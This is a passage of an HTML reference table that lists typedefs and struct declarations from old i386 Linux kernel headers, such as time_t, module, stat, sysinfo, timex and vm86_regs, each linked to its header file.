            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_suseconds_t suseconds_t;
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="time_t" id="time_t">time_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            long __kernel_time_t; <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_time_t time_t;
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="uid_t" id="uid_t">uid_t</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/posix_types.h">include/asm/posix_types.h</a>:typedef
            unsigned short __kernel_uid_t;
            <br>
            <a href=
               "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            __kernel_uid_t uid_t;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="uint" id="uint">uint</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:typedef
            unsigned int uint;
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="__u32">__u32</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/types.h">include/asm/types.h</a>:typedef
            unsigned int __u32;
         </td>
      </tr>
    </tbody>
  </table>
</div>
<div class="col-md-6">
  <h1 id="structs">Struct Declarations</h1>
  <table id="struct" class="table table-hover table-condensed table-inverted table-bordered table-striped">
   <thead>
      <tr>
         <th>Struct</th>
         <th>Description</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <th valign="top"><a name="exception_table_entry" id=
            "exception_table_entry">exception_table_entry</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/module.h">include/linux/module.h</a>:
            <br>
            struct exception_table_entry {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long insn, fixup;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="iovec" id="iovec">iovec</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/uio.h">include/linux/uio.h</a>:
            <br>
            struct iovec {
            <br>
            &#160;&#160;&#160;&#160;&#160;void *iov_base;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__kernel_size_t">__kernel_size_t</a> iov_len;
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="itimerval" id=
            "itimerval">itimerval</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/time.h">include/linux/time.h</a>:
            <br>
            struct itimerval {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#timeval">struct timeval</a> it_interval; /*
            timer interval */
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#timeval">struct timeval</a> it_value; /* current
            value */
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="kernel_sym" id=
            "kernel_sym">kernel_sym</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/module.h">include/linux/module.h</a>:
            <br>
            struct kernel_sym {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long value;
            <br>
            &#160;&#160;&#160;&#160;&#160;char name[60];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="mmap_arg_struct" id=
            "mmap_arg_struct">mmap_arg_struct</a></th>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a>:
            <br>
            struct mmap_arg_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long addr;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long len;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long prot;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long flags;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long fd;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long offset;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="module" id="module">module</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/module.h">include/linux/module.h</a>:
            <br>
            struct module {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long size_of_struct; /*
            sizeof(module) */
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#module">struct module</a> *next;
            <br>
            &#160;&#160;&#160;&#160;&#160;const char *name;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long size;
            <br>
            &#160;&#160;&#160;&#160;&#160;union {
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<a href="#atomic_t">atomic_t</a>
            usecount;
            <br>
            &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;long
            pad;
            <br>
            &#160;&#160;&#160;&#160;&#160;} uc;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long flags; /* AUTOCLEAN
            et al */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned nsyms;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned ndeps;
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#module_symbol">struct module_symbol</a> *syms;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#module_ref">struct module_ref</a> *deps;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#module_ref">struct module_ref</a> *refs;
            <br>
            &#160;&#160;&#160;&#160;&#160;int (*init)(void);
            <br>
            &#160;&#160;&#160;&#160;&#160;void (*cleanup)(void);
            <br>
            &#160;&#160;&#160;&#160;&#160;const <a href=
               "#exception_table_entry">struct
            exception_table_entry</a> *ex_table_start;
            <br>
            &#160;&#160;&#160;&#160;&#160;const <a href=
               "#exception_table_entry">struct
            exception_table_entry</a> *ex_table_end;
            <br>
            /* Members past this point are extensions to the basic
            <br>
            module support and are optional. Use mod_opt_member()
            <br>
            to examine them. */
            <br>
            &#160;&#160;&#160;&#160;&#160;const <a href=
               "#module_persist">struct module_persist</a>
            *persist_start;
            <br>
            &#160;&#160;&#160;&#160;&#160;const <a href=
               "#module_persist">struct module_persist</a>
            *persist_end;
            <br>
            &#160;&#160;&#160;&#160;&#160;int (*can_unload)(void);
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="module_persist" id=
            "module_persist">module_persist</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/module.h">include/linux/module.h</a>:
            <br>
            struct module_persist; /* yes, it's empty */
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="module_ref" id=
            "module_ref">module_ref</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/module.h">include/linux/module.h</a>:
            <br>
            struct module_ref {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#module">struct module</a> *dep; /* "parent"
            pointer */
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#module">struct module</a> *ref; /* "child"
            pointer */
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#module_ref">struct module_ref</a> *next_ref;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="module_symbol" id=
            "module_symbol">module_symbol</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/module.h">include/linux/module.h</a>:
            <br>
            struct module_symbol {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long value;
            <br>
            &#160;&#160;&#160;&#160;&#160;const char *name;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="new_utsname" id=
            "new_utsname">new_utsname</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/utsname.h">include/linux/utsname.h</a>:
            <br>
            struct new_utsname {
            <br>
            &#160;&#160;&#160;&#160;&#160;char sysname[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char nodename[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char release[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char version[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char machine[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char domainname[65];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name=
            "__old_kernel_stat">__old_kernel_stat</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/stat.h">include/asm/stat.h</a>:
            <br>
            struct __old_kernel_stat {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_dev;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_ino;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_mode;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_nlink;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_uid;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_gid;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_rdev;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_size;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_atime;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_mtime;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_ctime;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="oldold_utsname" id=
            "oldold_utsname">oldold_utsname</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/utsname.h">include/linux/utsname.h</a>:
            <br>
            struct oldold_utsname {
            <br>
            &#160;&#160;&#160;&#160;&#160;char sysname[9];
            <br>
            &#160;&#160;&#160;&#160;&#160;char nodename[9];
            <br>
            &#160;&#160;&#160;&#160;&#160;char release[9];
            <br>
            &#160;&#160;&#160;&#160;&#160;char version[9];
            <br>
            &#160;&#160;&#160;&#160;&#160;char machine[9];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="old_sigaction" id=
            "old_sigaction">old_sigaction</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/signal.h">include/asm/signal.h</a>:
            <br>
            struct old_sigaction {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__sighandler_t">__sighandler_t</a> sa_handler;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#old_sigset_t">old_sigset_t</a> sa_mask;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long sa_flags;
            <br>
            &#160;&#160;&#160;&#160;&#160;void (*sa_restorer)(void);
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="old_utsname" id=
            "old_utsname">old_utsname</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/utsname.h">include/linux/utsname.h</a>:
            <br>
            struct old_utsname {
            <br>
            &#160;&#160;&#160;&#160;&#160;char sysname[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char nodename[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char release[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char version[65];
            <br>
            &#160;&#160;&#160;&#160;&#160;char machine[65];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="pollfd" id="pollfd">pollfd</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/poll.h">include/asm/poll.h</a>:
            <br>
            struct pollfd {
            <br>
            &#160;&#160;&#160;&#160;&#160;int fd;
            <br>
            &#160;&#160;&#160;&#160;&#160;short events;
            <br>
            &#160;&#160;&#160;&#160;&#160;short revents;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="pt_regs" id=
            "pt_regs">pt_regs</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/ptrace.h">include/asm/ptrace.h</a>:
            <br>
            struct pt_regs {
            <br>
            &#160;&#160;&#160;&#160;&#160;long ebx;
            <br>
            &#160;&#160;&#160;&#160;&#160;long ecx;
            <br>
            &#160;&#160;&#160;&#160;&#160;long edx;
            <br>
            &#160;&#160;&#160;&#160;&#160;long esi;
            <br>
            &#160;&#160;&#160;&#160;&#160;long edi;
            <br>
            &#160;&#160;&#160;&#160;&#160;long ebp;
            <br>
            &#160;&#160;&#160;&#160;&#160;long eax;
            <br>
            &#160;&#160;&#160;&#160;&#160;int xds;
            <br>
            &#160;&#160;&#160;&#160;&#160;int xes;
            <br>
            &#160;&#160;&#160;&#160;&#160;long orig_eax;
            <br>
            &#160;&#160;&#160;&#160;&#160;long eip;
            <br>
            &#160;&#160;&#160;&#160;&#160;int xcs;
            <br>
            &#160;&#160;&#160;&#160;&#160;long eflags;
            <br>
            &#160;&#160;&#160;&#160;&#160;long esp;
            <br>
            &#160;&#160;&#160;&#160;&#160;int xss;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="revectored_struct" id=
            "revectored_struct">revectored_struct</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/vm86.h">include/asm/vm86.h</a>:
            <br>
            struct revectored_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long __map[8];
            <br>
            };
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="rlimit" id="rlimit">rlimit</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/resource.h">include/linux/resource.h</a>:
            <br>
            struct rlimit {
            <br>
            &#160;&#160;&#160;&#160;&#160;long rlim_cur;
            <br>
            &#160;&#160;&#160;&#160;&#160;long rlim_max;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="rusage" id="rusage">rusage</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/resource.h">include/linux/resource.h</a>:
            <br>
            struct rusage {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#timeval">struct timeval</a> ru_utime; /* user
            time used */
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#timeval">struct timeval</a> ru_stime; /* system
            time used */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_maxrss; /* maximum
            resident set size */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_ixrss; /* integral shared
            memory size */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_idrss; /* integral
            unshared data size */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_isrss; /* integral
            unshared stack size */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_minflt; /* page reclaims
            */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_majflt; /* page faults */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_nswap; /* swaps */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_inblock; /* block input
            operations */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_oublock; /* block output
            operations */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_msgsnd; /* messages sent
            */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_msgrcv; /* messages
            received */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_nsignals; /* signals
            received */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_nvcsw; /* voluntary
            context switches */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ru_nivcsw; /* involuntary ''
            */
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="sched_param" id=
            "sched_param">sched_param</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/sched.h">include/linux/sched.h</a>:
            <br>
            struct sched_param {
            <br>
            &#160;&#160;&#160;&#160;&#160;int sched_priority;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="sel_arg_struct" id=
            "sel_arg_struct">sel_arg_struct</a></th>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a>:
            <br>
            struct sel_arg_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long n;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#fd_set">fd_set</a> *inp, *outp, *exp;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#timeval">struct timeval</a> *tvp;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="sigaction" id=
            "sigaction">sigaction</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/signal.h">include/asm/signal.h</a>:
            <br>
            struct sigaction {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__sighandler_t">__sighandler_t</a> sa_handler;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long sa_flags;
            <br>
            &#160;&#160;&#160;&#160;&#160;void (*sa_restorer)(void);
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#sigset_t">sigset_t</a> sa_mask; /* mask last for
            extensibility */
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="stat" id="stat">stat</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/stat.h">include/asm/stat.h</a>:
            <br>
            struct stat {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_dev;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short __pad1;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_ino;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_mode;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_nlink;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_uid;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_gid;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short st_rdev;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short __pad2;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_size;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_blksize;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_blocks;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_atime;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long __unused1;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_mtime;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long __unused2;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long st_ctime;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long __unused3;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long __unused4;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long __unused5;
            <br>
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="statfs" id="statfs">statfs</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/statfs.h">include/asm/statfs.h</a>:
            <br>
            struct statfs {
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_type;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_bsize;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_blocks;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_bfree;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_bavail;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_files;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_ffree;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__kernel_fsid_t">__kernel_fsid_t</a> f_fsid;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_namelen;
            <br>
            &#160;&#160;&#160;&#160;&#160;long f_spare[6];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="__sysctl_args">__sysctl_args</a></th>
         <td>include/linux/sysctl.h
            <br>
            struct __sysctl_args {
            <br>
            &#160;&#160;&#160;&#160;&#160;int *name;
            <br>
            &#160;&#160;&#160;&#160;&#160;int nlen;
            <br>
            &#160;&#160;&#160;&#160;&#160;void *oldval;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#size_t">size_t</a> *oldlenp;
            <br>
            &#160;&#160;&#160;&#160;&#160;void *newval;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#size_t">size_t</a> newlen;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long __unused[4];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="sysinfo" id=
            "sysinfo">sysinfo</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/kernel.h">include/linux/kernel.h</a>:
            <br>
            struct sysinfo {
            <br>
            &#160;&#160;&#160;&#160;&#160;long uptime; /* Seconds since
            boot */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long loads[3]; /* 1, 5,
            and 15 minute load averages */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long totalram; /* Total
            usable main memory size */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long freeram; /*
            Available memory size */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long sharedram; /*
            Amount of shared memory */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long bufferram; /*
            Memory used by buffers */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long totalswap; /* Total
            swap space size */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long freeswap; /* swap
            space still available */
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short procs; /* Number
            of current processes */
            <br>
            &#160;&#160;&#160;&#160;&#160;char _f[22]; /* Pads structure to
            64 bytes */
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="timex" id="timex">timex</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/timex.h">include/linux/timex.h</a>:
            <br>
            struct timex {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned int modes; /* mode
            selector */
            <br>
            &#160;&#160;&#160;&#160;&#160;long offset; /* time offset
            (usec) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long freq; /* frequency offset
            (scaled ppm) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long maxerror; /* maximum error
            (usec) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long esterror; /* estimated error
            (usec) */
            <br>
            &#160;&#160;&#160;&#160;&#160;int status; /* clock
            command/status */
            <br>
            &#160;&#160;&#160;&#160;&#160;long constant; /* pll time
            constant */
            <br>
            &#160;&#160;&#160;&#160;&#160;long precision; /* clock
            precision (usec) (read only) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long tolerance; /* clock
            frequency tolerance (ppm)
            <br>
            &#160;&#160;&#160;&#160;&#160; * (read only)
            <br>
            &#160;&#160;&#160;&#160;&#160; */
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#timeval">struct timeval</a> time; /* (read only)
            */
            <br>
            &#160;&#160;&#160;&#160;&#160;long tick; /* (modified) usecs
            between clock ticks */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ppsfreq; /* pps frequency
            (scaled ppm) (ro) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long jitter; /* pps jitter (us)
            (ro) */
            <br>
            &#160;&#160;&#160;&#160;&#160;int shift; /* interval duration
            (s) (shift) (ro) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long stabil; /* pps stability
            (scaled ppm) (ro) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long jitcnt; /* jitter limit
            exceeded (ro) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long calcnt; /* calibration
            intervals (ro) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long errcnt; /* calibration
            errors (ro) */
            <br>
            &#160;&#160;&#160;&#160;&#160;long stbcnt; /* stability limit
            exceeded (ro) */
            <br>
            <br>
            &#160;&#160;&#160;&#160;&#160;int :32; int :32; int :32; int
            :32;
            <br>
            &#160;&#160;&#160;&#160;&#160;int :32; int :32; int :32; int
            :32;
            <br>
            &#160;&#160;&#160;&#160;&#160;int :32; int :32; int :32; int
            :32;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="timespec" id=
            "timespec">timespec</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/time.h">include/linux/time.h</a>:
            <br>
            struct timespec {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#time_t">time_t</a> tv_sec; /* seconds */
            <br>
            &#160;&#160;&#160;&#160;&#160;long tv_nsec; /* nanoseconds */
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="timeval" id=
            "timeval">timeval</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/time.h">include/linux/time.h</a>:
            <br>
            struct timeval {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#time_t">time_t</a> tv_sec; /* seconds */
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#suseconds_t">suseconds_t</a> tv_usec; /*
            microseconds */
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="timezone" id=
            "timezone">timezone</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/time.h">include/linux/time.h</a>:
            <br>
            struct timezone {
            <br>
            &#160;&#160;&#160;&#160;&#160;int tz_minuteswest; /* minutes
            west of Greenwich */
            <br>
            &#160;&#160;&#160;&#160;&#160;int tz_dsttime; /* type of dst
            correction */
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="tms" id="tms">tms</a></th>
         <td>include/linux/times.h
            <br>
            struct tms {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#clock_t">clock_t</a> tms_utime;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#clock_t">clock_t</a> tms_stime;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#clock_t">clock_t</a> tms_cutime;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#clock_t">clock_t</a> tms_cstime;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="ustat" id="ustat">ustat</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/types.h">include/linux/types.h</a>:
            <br>
            struct ustat {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__kernel_daddr_t">__kernel_daddr_t</a> f_tfree;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#__kernel_ino_t">__kernel_ino_t</a> f_tinode;
            <br>
            &#160;&#160;&#160;&#160;&#160;char f_fname[6];
            <br>
            &#160;&#160;&#160;&#160;&#160;char f_fpack[6];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="utimbuf" id=
            "utimbuf">utimbuf</a></th>
         <td><a href=
            "file:///usr/src/linux/include/linux/utime.h">include/linux/utime.h</a>:
            <br>
            struct utimbuf {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#time_t">time_t</a> actime;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#time_t">time_t</a> modtime;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="vm86plus_info_struct" id=
            "vm86plus_info_struct">vm86plus_info_struct</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/vm86.h">include/asm/vm86.h</a>:
            <br>
            struct vm86plus_info_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long
            force_return_for_pic:1;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long vm86dbg_active:1;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long vm86dbg_TFpendig:1;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long unused:28;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long is_vm86pus:1;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned char
            vm86dbg_intxxtab[32];
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="vm86plus_struct" id=
            "vm86plus_struct">vm86plus_struct</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/vm86.h">include/asm/vm86.h</a>:
            <br>
            struct vm86plus_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#vm86_regs">struct vm86_regs</a> regs;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long flags;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long screen_bitmap;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long cpu_type;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#revectored_struct">struct revectored_struct</a>
            int_revectored;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#revectored_struct">struct revectored_struct</a>
            int21_revectored;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#vm86plus_info_struct">struct
            vm86plus_info_struct</a> vm86plus;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="vm86_regs" id=
            "vm86_regs">vm86_regs</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/vm86.h">include/asm/vm86.h</a>:
            <br>
            struct vm86_regs {
            <br>
            /* normal regs, with special meaning for the segment
            descriptors.. */
            <br>
            &#160;&#160;&#160;&#160;&#160;long ebx;
            <br>
            &#160;&#160;&#160;&#160;&#160;long ecx;
            <br>
            &#160;&#160;&#160;&#160;&#160;long edx;
            <br>
            &#160;&#160;&#160;&#160;&#160;long esi;
            <br>
            &#160;&#160;&#160;&#160;&#160;long edi;
            <br>
            &#160;&#160;&#160;&#160;&#160;long ebp;
            <br>
            &#160;&#160;&#160;&#160;&#160;long eax;
            <br>
            &#160;&#160;&#160;&#160;&#160;long __null_ds;
            <br>
            &#160;&#160;&#160;&#160;&#160;long __null_es;
            <br>
            &#160;&#160;&#160;&#160;&#160;long __null_fs;
            <br>
            &#160;&#160;&#160;&#160;&#160;long __null_gs;
            <br>
            &#160;&#160;&#160;&#160;&#160;long orig_eax;
            <br>
            &#160;&#160;&#160;&#160;&#160;long eip;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short cs, __csh;
            <br>
            &#160;&#160;&#160;&#160;&#160;long eflags;
            <br>
            &#160;&#160;&#160;&#160;&#160;long esp;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short ss, __ssh;
            <br>
            /* these are specific to v86 mode: */
            <br>
